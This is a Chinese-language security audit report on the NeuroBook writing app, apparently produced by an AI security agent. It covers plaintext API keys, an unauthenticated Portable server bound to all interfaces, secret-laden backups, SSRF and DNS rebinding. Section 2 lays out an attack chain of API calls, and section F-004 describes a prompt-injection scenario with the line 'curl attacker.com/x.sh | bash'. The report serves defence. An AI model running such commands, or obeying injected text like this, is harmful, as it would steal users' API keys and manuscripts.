# NeuroBook 安全审计报告（OWASP + STRIDE）

- **审计人**：gstack-security-officer（软件工坊安全官）
- **日期**：2026-09-17
- **范围**：`D:\MyProject\neuro-book` 全仓（Bun + TS monorepo）。静态代码取证为主，辅以本机 State Root 实测与 Node 绑定行为实测
- **模式**：Comprehensive（全 14 阶段）
- **约束**：全程只读，未修改任何源码或配置文件
- **证据强度标注**：**【确认】** = 有代码路径 + 行号，或已实测复现；**【推断】** = 由代码强证据推出但存在未验证环节；**【未证实】** = 仅线索，未查实

---

## 0. 结论先行（给 GTF 的三句话）

1. **有 🔴 级确认漏洞，而且是一条链，不是一个点**：Provider API Key 明文写在你硬盘上 → Portable 版默认不设密码且服务绑在**所有网卡**上 → 备份功能会把这些 Key 打包成一个文件。**同局域网任何人在默认配置下能把你全部小说、AI 会话和 API Key 一次端走。**
2. **好消息**：核心的"防呆"做得很扎实——密码用 scrypt 加盐、登录有防爆破、项目路径穿越堵死了、Electron 沙箱全开、World Engine 动态加载有 import 白名单。**这些地方我挑不出毛病，别动。**
3. **要改的话只改三处，两天内能收口**：① Portable 启动强制 `HOST=127.0.0.1`（**不是**改 `config.yaml`，那个字段没人读）；② API Key 用 Windows DPAPI 加密落盘；③ 备份包默认不含 secret。

**严重度分布**：🔴 3 条 ／ 🟠 3 条 ／ 🟡 4 条 ／ 🟢 4 条（做对的地方）

---

## 1. 你交给我的三个问题：确定性答复

### 1.1 Provider API Key 是否明文落盘？→ **【确认】明文，无加密**

**结论：明文。写入路径上没有任何加密调用，磁盘上就是可读的 JSON 字符串。**

完整证据链：

| 环节 | 位置 | 内容 |
|---|---|---|
| 落盘路径 | `packages/neuro-book/server/config/config-service.ts:87-89` | `globalConfigPath() = path.join(resolveUserNbookRoot(), "config.json")` → State Root 的 `workspace/.nbook/config.json` |
| 写入方式 | 同文件 `:1561-1564` | `writeJsonFile()` → `fs.writeFile(filePath, JSON.stringify(value, null, 4))`。**纯明文 JSON，无 cipher、无 OS 加密 API、无权限收紧** |
| Key 取值 | 同文件 `:1319-1332` | `apiKey: resolveSecretWrite({...})` |
| 取值实现 | 同文件 `:1305-1310` | `resolveSecretWrite` 返回 `input.value.trim()` —— **原样字符串，trim 后直接入库** |
| 旧值保留 | 同文件 `:1405-1430` | `resolveProviderApiKey` 从已有配置读旧 key 原样返回 |
| 同类明文 | 同文件 `:1444-1452`（embedding）、`:1462-1478`（Tavily / Brave 搜索） | 同样的 `resolveSecretWrite` 明文路径 |

**读取侧是脱敏的，但那只保护"看屏幕的人"，不保护"读硬盘的人"**：
- `config-service.ts:462-501` `redactGlobalConfig()` 在**返回给前端前**调 `maskSecret()`
- `:1291-1303` `maskSecret()` 返回 `{configured: true, maskedValue: "abcd...wxyz"}`

**实测复现**（本机，不输出任何真实值）：
```
路径：C:\Users\Administrator\AppData\Local\NeuroBook\data\workspace\.nbook\config.json
grep -c '"apiKey"'  →  6 处
其中非空值长度：35 / 49 / 51 / 57 字符
```
→ **磁盘上确实躺着 4 个可用的明文 API Key。**

> 补充说明：主理人上一轮检索 `createCipheriv|createDecipheriv|bcrypt|scrypt|randomBytes` 没找到密钥加密代码——**这个判断是对的，我独立复核确认全仓确实没有用于加密落盘 secret 的代码**。`scrypt` 只用于用户密码（`server/utils/password.ts`，见 §4.3 好评），`randomBytes` 只用于 token/salt/session。

---

### 1.2 Portable 默认关闭鉴权的暴露面？→ **【确认】默认无鉴权 + 【确认】绑所有网卡（非 loopback）**

这条是本次审计**最严重**的发现。我把它拆成 10 级证据，逐级查实：

**① Portable 默认关闭鉴权 —— 确认**
- `packages/neuro-book-manager/src/cli.ts:112`
  `authEnabled: options.auth ?? profile !== "windows-portable"`
  → profile 是 `windows-portable` 时，不传 `--auth` 就是 `false`
- `packages/neuro-book-manager/src/install-guide.ts:80` 同样逻辑（交互式安装默认也是关）
- **额外发现（比文档说的更广）**：`packages/neuro-book-manager/src/desktop-installation.ts:183`
  `await writeFile(join(roots.state, "config.yaml"), "auth:\n    enabled: false\n", "utf8")`
  → **Electron / Tauri 桌面安装也硬写 `enabled: false`**，不只是 Portable

**② 鉴权关闭时，全站守卫是空操作 —— 确认**
- `packages/neuro-book/server/middleware/auth.ts:64-67`
  ```ts
  export default defineEventHandler(async (event) => {
      if (!isAuthEnabled()) {
          return;      // ← 直接放行一切请求
      }
  ```
- `packages/neuro-book/server/utils/auth.ts:180-185` `requireAdminAccess()` 同样在 `!isAuthEnabled()` 时直接 `return`
  → 管理员接口（用户管理、备份、配置）全部裸奔

**③ 监听地址：Portable 不设置 HOST —— 确认**

| 环节 | 位置 | 内容 |
|---|---|---|
| Product 启动器 | `packages/neuro-book/server/runtime/product-start-command.mjs:34` | `host: process.env.NITRO_HOST?.trim() \|\| process.env.HOST?.trim()` —— 没有就是 `undefined` |
| 环境构造 | `packages/neuro-book-contracts/src/product-runtime/environment.ts:33` | `...(host ? {HOST: host, NITRO_HOST: host} : {})` —— **host 为空则一个都不设** |
| State Root `.env` | `packages/neuro-book-manager/src/config.ts:32-39` | 只写 `NUXT_PORT` / `PORT` / `DATABASE_KIND` / `DATABASE_URL` / `NUXT_SESSION_PASSWORD`，**没有 HOST** |
| Nitro 取值 | `node_modules/nitropack/dist/presets/node/runtime/node-server.mjs:18` | `const host = process.env.NITRO_HOST \|\| process.env.HOST;` → `undefined` |
| Nitro 监听 | 同文件 `:20` | `server.listen(path ? {path} : {port, host})` |

**④ Node 在 host=undefined 时绑什么 —— 我已实测**

我用 Node 22.22.2 复刻了 Nitro 的等价调用（`C:\Users\Administrator\AppData\Local\Temp\nb-audit-bind-probe.mjs`）：
```
NITRO_HOST/HOST = undefined
实际绑定地址 = {"address":"::","family":"IPv6","port":50347}   ← 通配地址，所有网卡

--- 对照组 HOST=127.0.0.1 ---
实际绑定地址 = {"address":"127.0.0.1","family":"IPv4"}        ← 仅本机
```
→ **`::` 是双栈通配地址 = 监听全部网卡（含局域网、公网网卡）**。

**综合结论：Windows Portable 默认 = 绑所有网卡 + 完全无鉴权。**【确认】

**⑤ 关于 `config.yaml` 里的 `server: {host: "0.0.0.0"}` —— 是个陷阱，改它没用**
- `packages/neuro-book-manager/src/config.ts:46` 生成的 `data/config.yaml` 确实写了 `server: {host: "0.0.0.0", port}`
- 但 **`BootConfig.server.host` 全仓没有任何消费者**。我 grep 了 `server?.host` / `server.host` / `.server?.`，零命中
- Boot Config 只有两个字段被真正读取：`auth.enabled`（`server/config/boot-config.ts:32`）和 `database`（`server/database/config.ts:77`）
- → 如果你按 `config.yaml` 去"改成 127.0.0.1"，**不会有任何效果**。这正是仓库内既有审计 F-018 记的那个坑，我独立复核确认无误

**⑥ "动态 loopback" 和 "startup nonce header 保护" 的实际有效性 —— 澄清（这两项被高估了）**
- **动态 loopback**：指的是 `desktop/electron/src/main.ts:358` 用 `probe.listen({host: "127.0.0.1", port: 0})` **找空闲端口**，以及 ADR 0010 §"loopback 与关闭"第 1 条"Desktop Product 强制设置 `HOST=NITRO_HOST=127.0.0.1`"。→ **只对 Electron/Tauri 桌面版有效，Portable 不走这条路径**（Portable 是 Product Runtime 直接启动）
- **startup nonce**：`desktop/electron/src/main.ts:409, 553` 与 `desktop/tauri/src/main.rs:645, 747` —— 它是**宿主进程与被拉起的 supervisor 子进程之间的 IPC 握手校验**（校验 ready 消息里的 nonce 是否本次启动生成），**根本不是 HTTP 请求头校验，不防护任何网络请求**。PROJECT-STATUS 里"startup nonce header 保护"这个说法容易误导，它不是 HTTP 层的东西
- → **这两项都不能用来给 Portable 兜底**

**⑦ 唯一真正有效的 loopback 防护在 shutdown 端点**（`server/routes/__nbook/control/shutdown.post.ts:7-22, 25-32`）：只接受 loopback + Bearer token + `timingSafeEqual` 恒定时间比较。**这一处写得很好**，但它只保护"关机"这一个动作，不保护数据接口。

---

### 1.3 Electron / Tauri 无签名发布意味着什么？→ **【确认】三点实质风险**

证据：`PROJECT-STATUS.md:54`（"公开签名安装器和正式 Desktop 发行方案仍未完成"）、`:74`（"仍是未签名 spike 交付"）、`:87`；CI 侧我 grep `.github/workflows/` 全部 9 个文件，**`signtool` / `codesign` / `notary` / `audit` 零命中**。

实际后果（不是理论）：
1. **二进制可被替换，且无法察觉** —— 没有 Authenticode 签名，就没有完整性校验。谁能在传输/镜像环节换掉你的 628MB ZIP，就能让所有下载者跑他的代码。用户侧 Windows SmartScreen 会弹"未知发布者"，这反过来**训练用户习惯性点"仍要运行"**，等于把社会工程学门槛也拆了
2. **安全修复没有触达通道** —— 没有 updater。等你修完本次审计的 🔴 级漏洞，**已装在你用户机器上的旧版本不会自己更新**。你只能靠用户主动来看 GitHub 并手动重装。`PROJECT-STATUS.md:87` 也确认了"后台 updater 未完成"
3. **漏洞披露后无回滚能力** —— 无法强制下线有问题的版本

**好消息**：Electron 自身沙箱配置是**正确且完整**的（`desktop/electron/src/main.ts:949`）：
```ts
webPreferences: {
    preload: ..., nodeIntegration: false,
    contextIsolation: true, sandbox: true, webSecurity: true
}
```
四项全开，这是教科书级配置。**签名是分发层问题，不是运行时配置问题。**

---

## 2. 攻击链：三条 🔴 如何串成一次完整入侵

这是本次审计最需要 GTF 理解的图：

```
[默认安装的 Windows Portable，用户双击启动]
        │
        ├─ F-002a  鉴权默认关闭         (cli.ts:112)
        ├─ F-002b  未设 HOST → 绑 "::"  (environment.ts:33 + 实测)
        │
        ▼
同一 WiFi / 同一公司局域网里的任何人
        │
        ├─► GET  /api/projects                    → 列出全部作品
        ├─► GET  /api/projects/open  {projectRoot}→ 打开任意作品
        ├─► GET  /api/**                          → 读写全部正文、角色、剧情、Agent 会话
        ├─► GET  /api/passport/backups            → 列出备份
        ├─► POST /api/passport/backups            → 【触发打包】
        │        └─ F-003 backup-archive-service.ts:14,98-101
        │           打包范围 = workspace/ + config.yaml + .env
        │           ├─ workspace/.nbook/config.json ← F-001 的 4 个明文 API Key
        │           └─ .env                          ← NUXT_SESSION_PASSWORD（会话签名密钥）
        └─► GET  /api/passport/backups/[id]       → 下载这个 ZIP
                    │
                    ▼
        攻击者拿到：全部小说原稿 + 全部 LLM API Key + 会话密钥
```

**一次请求组合，全量失窃。** 而且因为 F-002b 绑的是 `::`，攻击者甚至不需要在同一局域网——如果这个 Portable 跑在有公网 IP 的机器上（云服务器、有端口映射的家用机），就是互联网可达。

---

## 3. 完整发现清单

### 3.1 🔴 严重（Critical）

#### F-001　Provider API Key / 搜索 Key / Embedding Key 明文落盘
- **分类**：OWASP A02（加密失败）／ STRIDE Information Disclosure
- **严重度**：🔴　**置信度 10/10**（代码路径完整 + 本机磁盘实测复现）
- **位置**：`packages/neuro-book/server/config/config-service.ts:87-89, 1305-1310, 1319-1332, 1444-1452, 1462-1478, 1561-1564`
- **受影响资产**：State Root `workspace/.nbook/config.json`（Windows 默认 `%LOCALAPPDATA%\NeuroBook\data\workspace\.nbook\config.json`）
- **描述**：见 §1.1。写入路径无任何加密；读取脱敏只作用于 API 出口
- **复现步骤**：
  1. 打开设置 → 模型 → 填一个 Provider API Key → 保存
  2. 打开 `%LOCALAPPDATA%\NeuroBook\data\workspace\.nbook\config.json`
  3. 搜索 `apiKey`，明文可见
- **为什么是 🔴 而不是 🟠**：单独看是"本地明文"，属中危；但它与 F-002/F-003 组合后，明文 Key 会通过网络可达路径被远程批量取走，这是链式放大
- **修复（P0）**：
  - 短期：State Root 目录与 `config.json` 收紧 ACL 到仅当前用户（等价 `chmod 600`），并在设置页保留"从环境变量读取"的逃生通道
  - 中期：Windows 用 `CryptProtectData`（DPAPI，绑定当前用户账户）/ macOS Keychain / Linux libsecret 加密 `apiKey` 字段；读不到时回退明文并警告
  - 长期：Secret 与配置分离存储，配置文件只存引用

---

#### F-002　Windows Portable 默认无鉴权且监听所有网卡
- **分类**：OWASP A01（访问控制失效）+ A05（安全配置错误）／ STRIDE Spoofing + Elevation of Privilege
- **严重度**：🔴　**置信度 9/10**（代码链完整 + Node 绑定行为实测；扣 1 分因为没有真实 Portable 运行实例做最终确认）
- **位置**：见 §1.2 的 10 级证据表，核心是
  - `packages/neuro-book-manager/src/cli.ts:112`
  - `packages/neuro-book-contracts/src/product-runtime/environment.ts:33`
  - `packages/neuro-book/server/middleware/auth.ts:64-67`
  - `packages/neuro-book/server/utils/auth.ts:180-185`
  - `node_modules/nitropack/dist/presets/node/runtime/node-server.mjs:18`
- **描述**：默认配置 = 全站无鉴权 + 双栈通配监听
- **复现步骤**：
  1. 取一份 Windows Portable 包，解压，双击启动
  2. 在同一局域网另一台机器上访问 `http://<该机内网IP>:3000/api/projects`
  3. 直接返回作品列表，无需任何凭据
- **注意（避免踩坑）**：**不要去改 `config.yaml` 里的 `server.host`**，该字段无消费者（§1.2 ⑤）
- **修复（P0）**：
  - **首选**：在 Portable 启动路径（`product-start-command.mjs` / `windows-portable-manager.ts`）默认注入 `HOST=127.0.0.1` 与 `NITRO_HOST=127.0.0.1`，与 `scripts/cli/source-dev.ts:86` 的做法保持一致
  - **兜底（fail-closed）**：启动时若解析出监听地址非 loopback 且 `auth.enabled !== true`，**拒绝启动**并给出明确中文提示
  - 顺带修：`desktop-installation.ts:183` 给桌面安装也硬关了鉴权，应改为尊重用户选择

---

#### F-003　备份归档打包全部 Secret，且备份接口无独立鉴权
- **分类**：OWASP A01 + A02 ／ STRIDE Information Disclosure
- **严重度**：🔴　**置信度 9/10**（归档范围代码明确；接口无独立鉴权已确认，但它依赖的全局中间件在默认 Portable 下确实空操作 —— 链已闭合）
- **位置**：
  - `packages/neuro-book/server/backup/backup-archive-service.ts:14`（注释明写范围）
  - 同文件 `:98-101`（`for (const topLevel of ["config.yaml", ".env"])`）
  - `packages/neuro-book/server/api/passport/backups/{index.get.ts, index.post.ts, [id].delete.ts}`（三处均无 `requireAdminAccess` / `requireCurrentUser` 调用，纯靠全局中间件）
- **描述**：备份 ZIP 内含 `workspace/`，而 `workspace/.nbook/config.json` 就在其中 → 一份备份 = 全部小说 + 全部明文 API Key + 会话签名密钥
- **复现步骤**：设置 → 备份 → 导出 → 用任意压缩软件打开 ZIP → `workspace/.nbook/config.json` → 明文 Key 可见
- **修复（P0）**：
  - 三处备份端点显式加 `await requireAdminAccess(event)`（鉴权关闭时它会放行，但至少在开启鉴权的部署上是真保护）
  - 备份默认**排除** `config.json` 中的 `apiKey` / `embedding.apiKey` / `web.search.*.apiKey` 与 `.env`；如确需迁移密钥，提供单独的"含密钥加密备份"选项并要求口令
  - 备份文件名与日志中不得出现密钥

---

### 3.2 🟠 高危（High）

#### F-004　Agent 工具面：绝对路径绕过容器边界 + bash 工具任意命令执行
- **分类**：OWASP A01 ／ STRIDE Elevation of Privilege
- **严重度**：🟠　**置信度 9/10**
- **位置**：
  - `packages/neuro-book/server/workspace-files/authorized-file-operation.ts:103-117`
  - `packages/neuro-book/server/agent/tools/file-tools.ts:122`（工具描述明写 "Any absolute filesystem path can be used directly"）
  - `packages/neuro-book/server/agent/tools/file-tools.ts:368-372, 399, 449-450`（bash 工具）
- **描述**：
  1. **绝对路径放行**：`resolveFileTarget()` 中，若输入是绝对路径且不在当前 Project 内，返回 `containmentRoot: null` —— **不做任何容器检查**，`authorizeFileOperation:63-65` 的 `assertRealPathContained` 被跳过
  2. **bash 无门禁**：`createBashTool()` 用 `spawnOwnedProcess` 执行任意命令，cwd 为 Project Workspace，**无命令白名单、无确认机制**
- **攻击场景（提示注入链）**：
  ```
  作者从网上下载一个"小说项目模板"解压打开
    → 模板的 manuscript/ 或 lorebook/ 里藏了一段提示注入文本
    → Agent 读取正文时被注入
    → 注入内容指示 Agent：read("C:/Users/xxx/AppData/Local/NeuroBook/data/workspace/.nbook/config.json")
    → Agent 把 API Key 当作"上下文"发给了攻击者指定的服务器
    或：bash("curl attacker.com/x.sh | bash")
  ```
  这与 F-001/F-002 不同——**这条链不需要网络暴露，只需要用户打开一个恶意项目**
- **修复（P1）**：
  - 默认**拒绝**绝对路径，或把绝对路径限制在 State Root / 已注册 Project Workspace / 显式用户授权目录的白名单内
  - bash 工具增加命令审批（首次/危险命令弹确认）或提供"禁用 bash"开关
  - 对外部抓取/导入的内容做提示注入标记与隔离

---

#### F-005　World Engine 动态 import 用户 workspace 的 TypeScript = 无沙箱代码执行
- **分类**：OWASP A03（注入）+ A08 ／ STRIDE Tampering + Elevation of Privilege
- **严重度**：🟠　**置信度 8/10**
- **位置**：
  - `packages/neuro-book/server/world-engine/calendar.ts:49, 64-69`
  - `packages/neuro-book/server/world-engine/schema-loader.ts:70`
  - `packages/neuro-book/server/world-engine/single-file-typescript-config-import.ts:43, 240, 245-282`
- **描述**：加载 Project Workspace 里的 `world-engine/calendar.ts` / `world-engine/schema/index.ts`，esbuild 转译后 `import()` 到**主服务进程**
- **先说做得好的（这部分设计质量高于平均水平）**：
  - `single-file-typescript-config-import.ts:173-183` `classifySingleFileConfigSpecifier()`：只允许 `node:` 内置 + `zod` + `nbook/world-engine/schema`
  - `:89-136` 用 TypeScript AST 扫描 import/export/动态 import，`node:fs` 之外的相对路径、绝对路径、URL、非常量动态 import 全部拒绝
  - `:341-352` `assertWorldEngineArtifactClosure()` 二次确认产物只剩 `node:` 内置
  - → **防住了"引入第三方包"和"引入本地其他文件"这两条路，这是认真设计过的**
- **但风险仍在**：`node:` 白名单里包含 `node:child_process`、`node:fs`、`node:net`、`node:http`。也就是说 `calendar.ts` 里写 `import {execSync} from "node:child_process"; execSync("...")` 是**允许**的，且在**主进程、当前用户权限、无沙箱**下执行
- **风险边界（明确划一下）**：
  - 用户打开**自己写的**项目 → 等同用户自己跑脚本，风险可接受
  - 用户打开**别人给的项目**（模板、合作者的工程、网上下载的示例）→ **等同运行陌生人代码，无任何提示与确认**
- **修复（P1）**：
  - 首次加载某 Project 的 `world-engine/*.ts` 时，弹一次明确的中文确认框（"此项目包含可执行代码，将在应用内运行。来源可信吗？"），并记录决策
  - 进阶：移到 Worker thread / 子进程并用 Node `permission` 模型裁剪 `child_process`；最小改动是至少在静态检查里**显式拒绝 `node:child_process`、`node:net`、`node:http`**（日历配置没有理由需要它们）

---

#### F-006　无 CSRF 防护 / 无 Host 头校验 → DNS rebinding 可行
- **分类**：OWASP A01 ／ STRIDE Spoofing
- **严重度**：🟠　**置信度 8/10**
- **位置**：全仓搜索 `Origin` / `Referer` 校验 —— 在 `server/middleware/` 与 `server/utils/` 下**零命中**
- **描述**：
  - 没有任何 `Origin` / `Referer` / `Host` 白名单校验
  - Session Cookie 是 `sameSite: "lax"`（`server/utils/auth.ts:17-23`），能挡住一部分跨站 POST，但：
    - DNS rebinding 场景下攻击者域名解析到 `127.0.0.1`，浏览器判定**同源**，`SameSite` 完全失效
    - `lax` 允许顶层导航的 GET，配合可写状态变更的 GET 接口仍有空间
- **攻击场景**：作者访问恶意网页 → 该页 JS 让 `attacker.com` 的 DNS 指向 `127.0.0.1` → 以同源身份读写本地 NeuroBook 全部数据。**这个攻击在鉴权关闭（F-002）下更无阻力**
- **修复（P1）**：在 `server/middleware/auth.ts` 增加 Host/Origin 白名单，只接受 `127.0.0.1` / `localhost` / 已配置的显式域名；非白名单直接 403

---

### 3.3 🟡 中危（Medium）

#### F-007　发布链：无代码签名、无自动更新通道
- **严重度**：🟡　**置信度 10/10**（`PROJECT-STATUS.md:54,74,87` + CI grep 零命中）
- **详见 §1.3**。三项后果：二进制可被静默替换 / 安全修复无法触达存量用户 / 无回滚能力
- **修复（P2）**：申请代码签名证书 → CI 集成 `signtool`；引入 updater（Electron 用 `electron-updater`，Portable 至少做版本检查提示）

#### F-008　CI 无依赖审计门禁
- **严重度**：🟡　**置信度 10/10**
- **位置**：`.github/workflows/` 全部 9 个文件，`audit` 零命中
- **先说好的**：`bun.lock` 存在且 539KB，版本固定 ✅，供应链基础是有的
- **问题**：`node_modules` 体量巨大（含 esbuild、playwright、prisma、ai SDK 等），但**没有任何 CVE 扫描门禁**，依赖劣化不会被 CI 拦住
- **修复（P2）**：加 `bun audit` 或 osv-scanner 到 CI，至少对 high/critical 设为阻断

#### F-009　`web_fetch` 存在 SSRF：只校验协议，不校验目标地址
- **严重度**：🟡　**置信度 9/10**
- **位置**：`packages/neuro-book/server/agent/tools/web-tools.ts:472-482`（`assertHttpUrl`）、`:400-426`（`fetchWithRedirects`）
- **先说好的**：`assertHttpUrl` 明确拒绝非 `http:`/`https:` 协议 → **`file://`、`gopher://` 已挡住** ✅；且重定向每一跳都重新校验协议（`:423`）✅
- **问题**：不拒绝 `127.0.0.1`、RFC1918 内网段、`169.254.169.254`（云元数据）。Agent 可被诱导抓取内网服务或云元数据
- **修复（P2）**：在 `assertHttpUrl` 增加 IP 段黑名单（loopback / link-local / 私有网段），并在**每次重定向后**解析 DNS 重校验

#### F-010　登录限流可被 `X-Forwarded-For` 头绕过
- **严重度**：🟡　**置信度 9/10**
- **位置**：`packages/neuro-book/server/api/auth/login.post.ts:24`
  `const requestIp = getRequestIP(event, {xForwardedFor: true}) ?? "unknown";`
- **描述**：直连部署（Portable / 桌面 / 裸跑）时前面没有可信反代，攻击者每次请求换一个 `X-Forwarded-For` 即可刷新限流计数
- **修复（P2）**：仅在显式配置 `TRUST_PROXY=1` 时才信任 XFF；否则用 socket 远端地址

---

### 3.4 🟢 做对的地方（明确记录，别改坏）

审计的价值一半在于告诉你哪些地方**不用动**。以下四项我独立复核过，实现质量高于同类项目平均水平：

| 项 | 位置 | 为什么算好 |
|---|---|---|
| **密码哈希** | `server/utils/password.ts:11-16, 23-35` | **scrypt** + 16 字节随机 salt + 64 字节 key + `timingSafeEqual` 恒定时间比较。选型与实现都对，不是 MD5/SHA1 硬套 |
| **登录防爆破** | `server/api/auth/login.post.ts:26-42` 与 `server/utils/login-security.ts` | 有限流（`assertLoginAttemptAllowed`）、用户不存在时用 `loginDummyPasswordHash` 做等时比对（防时序侧信道）、统一失败文案（防用户名枚举）。四件套齐全 |
| **项目路径穿越防护** | `shared/dto/project.dto.ts:13-21` + `server/api/projects/project-control-plane.ts:19-35` | `projectRoot` 强制单段目录名：禁 `/` `\`、禁 `.` `..`、禁 `.nbook` 保留名、禁 Windows 保留设备名、禁控制字符、禁以点/空格结尾。**我试图构造穿越，构造不出来** |
| **文件容器校验** | `server/runtime/paths/file-path.ts:43-50, 72-77, 85-115` | `resolveContainedFilePath` 做 lexical 检查，`assertRealPathContained` + `relativeRealPathInside` 做 **realpath 检查**，且专门处理了 symlink/junction 逃逸与"最近已存在父目录"的情况（`:92-107`）。**这是认真设计过的，比大多数项目强**。F-004 的问题出在"绝对路径不进这个校验"，不是这个函数本身 |
| **Electron 沙箱** | `desktop/electron/src/main.ts:949` | `nodeIntegration: false` + `contextIsolation: true` + `sandbox: true` + `webSecurity: true`，四项全开 |
| **关机控制面** | `server/routes/__nbook/control/shutdown.post.ts:7-32` | loopback 校验（且不信任代理头）+ Bearer token + `timingSafeEqual` 恒定时间比较。唯一一处真正做对的网络侧 loopback 防护 |

---

## 4. STRIDE 威胁模型总表

| STRIDE | 威胁 | 对应发现 | 现状 |
|---|---|---|---|
| **S**poofing 仿冒 | 局域网内任何人仿冒合法用户 | F-002 | ❌ 默认无防护 |
| | DNS rebinding 仿冒同源 | F-006 | ❌ 无 Host/Origin 校验 |
| | 伪造 XFF 绕过身份限流 | F-010 | ⚠️ 部分 |
| **T**ampering 篡改 | 恶意项目篡改数据 / 执行代码 | F-005 | ⚠️ 有 import 白名单，无沙箱 |
| | 分发包被替换 | F-007 | ❌ 无签名 |
| **R**epudiation 否认 | 缺少安全审计日志 | — | ⚠️ 有 request-logger，但未确认覆盖安全事件与防篡改 |
| **I**nformation Disclosure 泄露 | API Key 明文 | F-001 | ❌ 确认明文 |
| | 备份泄露全量 Secret | F-003 | ❌ 确认 |
| | Agent 越权读任意文件 | F-004 | ❌ 绝对路径无边界 |
| **D**enial of Service 拒绝服务 | 资源耗尽 | — | ⚠️ 有输出截断与大小预算，未做系统性压测 |
| **E**levation of Privilege 提权 | 鉴权关闭 → 人人是管理员 | F-002 | ❌ 默认提权 |
| | 提示注入 → bash 执行 | F-004 | ❌ 无门禁 |

---

## 5. OWASP Top 10 覆盖

| 类别 | 状态 | 发现 |
|---|---|---|
| A01 访问控制失效 | ❌ | F-002（主）、F-003、F-004、F-006 |
| A02 加密失败 | ❌ | F-001（主）、F-003 |
| A03 注入 | ⚠️ | F-005（代码执行）；SQL 未见字符串拼接，参数化使用正常 |
| A04 不安全设计 | ⚠️ | 无速率限制在多数 API；鉴权默认关闭属设计选择而非缺陷 |
| A05 安全配置错误 | ❌ | F-002（默认监听 + 默认鉴权） |
| A06 易受攻击组件 | ⚠️ | F-008（有 lockfile，无审计门禁） |
| A07 认证失败 | ✅ | 密码与登录实现良好（§3.4）；仅 F-010 小问题 |
| A08 完整性失败 | ❌ | F-007（无签名）；反序列化未见原生风险 |
| A09 日志监控失败 | ⚠️ | 有 logger，未确认安全事件告警与日志防篡改 |
| A10 SSRF | ⚠️ | F-009（协议已挡，IP 未挡） |

---

## 6. 修复路线图（按投入产出排序）

### P0 —— 立刻做，两天内（切断那条 🔴 攻击链）

1. **Portable 启动路径强制 `HOST=127.0.0.1` + `NITRO_HOST=127.0.0.1`**
   - 改 `packages/neuro-book/server/runtime/product-start-command.mjs:34` 与 Portable 组装/启动入口，照抄 `packages/neuro-book/scripts/cli/source-dev.ts:86` 的写法（`...(configuredHost ? {} : {HOST: "127.0.0.1", NITRO_HOST: "127.0.0.1"})`）
   - **别去改 `config.yaml` 的 `server.host`，它没消费者**
   - **再加一条 fail-closed**：解析出非 loopback 监听且 `auth.enabled !== true` 时拒绝启动并中文提示
   - 验收：起 Portable，从另一台机器 `curl http://<内网IP>:3000/api/app/version` 必须失败或需要登录

2. **备份默认不含 Secret**
   - `backup-archive-service.ts:98-101` 的打包清单剔除 `.env`；`workspace/.nbook/config.json` 剔除 `apiKey` / `embedding.apiKey` / `web.search.*.apiKey`
   - 三处备份端点显式加 `requireAdminAccess(event)`

3. **（可选但便宜）State Root 权限收紧**：`config.json` 与 `.env` 创建时设置仅当前用户可读写

### P1 —— 本迭代

4. **API Key 加密落盘**：Windows DPAPI（`CryptProtectData`）优先；读不到时回退明文并警告
5. **Agent 工具面收口**：绝对路径默认拒绝或白名单化；bash 加审批开关
6. **Host/Origin 白名单中间件**（挡 DNS rebinding 与 CSRF）
7. **World Engine 可执行代码首次加载确认** + 静态检查显式拒绝 `node:child_process` / `node:net` / `node:http`

### P2 —— 发布前

8. 代码签名 + updater（F-007）
9. CI 加依赖审计门禁（F-008）
10. `web_fetch` 加 IP 段黑名单（F-009）
11. 登录限流不盲目信任 XFF（F-010）

---

## 7. 本次审计的边界与未证实项（诚实声明）

- **未做**：真实 Portable 构建的运行期监听验证。F-002 的结论由"代码链（10 级，全有行号）+ Node 绑定行为实测"推出，**扣 1 分置信度**就是因为缺这一步。若想 100% 落锤：在一台机器上起 Portable，另一台机器 `curl http://<内网IP>:3000/api/projects`
- **未做**：dev server 运行期探测。审计时本机 3000 端口无实例（`curl` 返回 000），因此所有 HTTP 层结论均来自静态代码
- **未做**：`node_modules` 的实际 CVE 扫描（未联网比对 CVE 库），F-008 仅断言"无门禁"这一事实
- **未做**：浏览器端人工验证、Electron 打包产物的完整性检查
- **未做**：日志防篡改与安全事件告警的深入审计（A09 标注为 ⚠️ 而非结论）
- **已引用**：仓库内既有审计 `.agents/tasks/127-nightly-audit/FINDINGS.md` 的 F-017/F-018。我**独立复核**了它的两条核心结论（Portable 默认无鉴权、绑所有网卡）并确认成立，同时通过 Node 实测补上了它自述缺失的"未实测监听地址"一环。F-018 关于"`config.yaml` 的 host 字段无消费者"的纠正我也独立验证无误——**这一条很重要，照旧文档去改会白改**

---

## 8. 与主理人初步判断的对照

| 主理人的线索 | 我的结论 | 差异说明 |
|---|---|---|
| ① API Key 可能明文落盘，"没找到证据 ≠ 确认明文" | **【确认】明文** | 已从"无加密代码"推进到"完整写入路径 + 磁盘实测 4 个非空 Key" |
| ② Portable 关闭鉴权，问监听是 loopback 还是 0.0.0.0 | **【确认】绑所有网卡（`::`）** | 关键补充：`config.yaml` 里的 `0.0.0.0` **不生效**（无消费者），真正的成因是"压根没设 HOST" |
| ② 附问：动态 loopback / startup nonce 有效性 | **对 Portable 无效** | 前者只对 Electron/Tauri 生效；后者是**进程间 IPC 握手**，不是 HTTP 防护。两项都被高估了 |
| ③ 无签名发布评估 | 三点实质风险（可替换 / 无修复通道 / 无回滚） | 补充：Electron 自身沙箱四项全开，是**好的**，别动 |
| — （未提及） | **新增 🔴 F-003 备份泄露** | 这条把 F-001 和 F-002 串成了完整入侵链，是本次最重要的**新发现** |
| — （未提及） | **新增 🟠 F-004 Agent 绝对路径越界** | 不需要网络暴露也能被利用的独立链路 |
